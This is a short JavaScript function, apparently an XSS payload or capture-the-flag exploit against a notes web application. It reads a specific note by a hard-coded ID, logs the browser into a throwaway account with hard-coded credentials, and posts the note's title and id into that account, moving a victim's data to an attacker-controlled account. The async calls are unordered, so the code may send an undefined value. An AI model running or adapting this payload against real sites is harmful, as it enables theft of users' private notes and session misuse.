function f(cookie) {
    let url = "/api/notes?id=a83ed14e-8c1c-43c3-ad7a-b5393ad85a3d";
    let url2 = "/api/notes";
    let data;

    fetch(url)
        .then(
            (response) => {
                return response.json();
            }
        ).then(
            (response) => {
                data = response[0];
            });

    fetch(
        "/login", {
        method: "POST",
        headers: {
            "content-type": "application/x-www-form-urlencoded"
        },
        body: "username=qweasd&password=qweasd"
    }).then(
        (response) => {
            fetch(
                url2, {
                method: "POST",
                headers: {
                    "content-type": "application/json",
                    "cookie": "session=" + cookie
                },
                body: JSON.stringify({ "title": data.title, "content": data.id })
            }
            );
        });
    return ""
}
